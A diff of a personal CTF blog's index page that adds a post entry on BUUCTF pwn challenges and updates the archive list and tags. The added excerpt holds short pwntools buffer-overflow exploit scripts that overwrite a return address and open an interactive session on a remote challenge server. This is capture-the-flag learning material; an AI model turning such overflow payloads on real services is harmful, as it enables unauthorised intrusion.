@@ -346,6 +346,45 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/12/29/PWN/" >
+            
+                <span>PWN(持续更新)</span>
+        </a>
+        <div class="abstract-content">
+            ripfrom pwn import *
+#p=process('./pwn1')
+p=remote('node3.buuoj.cn',27635)
+payload='a'*23+p64(0x401186)
+p.sendline(payload)
+p.interactive()
+warmup_csaw_2016本题远程没有flag.txt，可以ROP拿shell,有点懒就算了
+from pwn import *
+#=remote('node3.buuoj.cn',25705)
+p=process('./warmup_csaw_2016')
+payload='a'*72+p64(0x400...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/12/29</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "BUUCTF pwn">BUUCTF pwn</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/12/28/easy-tornado/" >
             
                 <span>easy_tornado</span>
@@ -642,9 +681,20 @@ for i in range (1,2000):
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 4
+        Total : 5
         </div>
         <!-- search  -->
         
@@ -660,6 +710,11 @@ for i in range (1,2000):
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2019/12/29/PWN/" >PWN(持续更新)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">12/28</span><a class="archive-post-title" href= "/2019/12/28/easy-tornado/" >easy_tornado</a>
         </li>
     
@@ -670,12 +725,12 @@ for i in range (1,2000):
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华北赛区-Day1-Web2-ikun/" >CISCN2019 华北赛区 Day1 Web2 ikun</a>
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华东北赛区-WEB2/" >CISCN2019 华东北赛区 WEB2</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华东北赛区-WEB2/" >CISCN2019 华东北赛区 WEB2</a>
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华北赛区-Day1-Web2-ikun/" >CISCN2019 华北赛区 Day1 Web2 ikun</a>
         </li>
     
     </div>
@@ -683,9 +738,11 @@ for i in range (1,2000):
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="BUUCTF web"><span class="iconfont-archer">&#xe606;</span>BUUCTF web</span>
-    
         <span class="sidebar-tag-name" data-tags="学习总结"><span class="iconfont-archer">&#xe606;</span>学习总结</span>
+    
+        <span class="sidebar-tag-name" data-tags="BUUCTF pwn"><span class="iconfont-archer">&#xe606;</span>BUUCTF pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="BUUCTF web"><span class="iconfont-archer">&#xe606;</span>BUUCTF web</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
